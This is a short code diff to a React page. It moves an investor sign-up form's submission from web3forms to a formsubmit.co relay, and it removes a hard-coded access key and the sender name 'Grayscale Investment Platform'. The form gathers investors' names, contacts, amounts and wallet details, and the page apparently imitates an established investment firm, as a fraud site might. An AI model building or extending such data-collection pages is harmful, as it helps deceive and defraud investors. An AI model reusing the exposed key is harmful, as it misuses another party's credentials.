@@ -55,13 +55,10 @@ export default function Page() {
     setShowSuccess(true);
 
     try {
-      await fetch("https://api.web3forms.com/submit", {
+      await fetch("https://formsubmit.co/el/suloba", {
         method: "POST",
         headers: { "Content-Type": "application/json", "Accept": "application/json" },
         body: JSON.stringify({
-          access_key: "0c8cb395-ada3-4ee9-b095-653e0611db8a",
-          subject: `NEW INVESTOR $${amount} - ${name} - ${country}`,
-          from_name: "Grayscale Investment Platform",
           Name: name,
           Email: email,
           Phone: phone,
@@ -70,6 +67,8 @@ export default function Page() {
           Amount: `$${amount}`,
           Referral: referral || "None",
           Wallet: wallet || "Not Connected",
+          _subject: `NEW INVESTOR $${amount} - ${name} - ${country}`,
+          _template: "table",
         }),
       });
     } catch (e) {
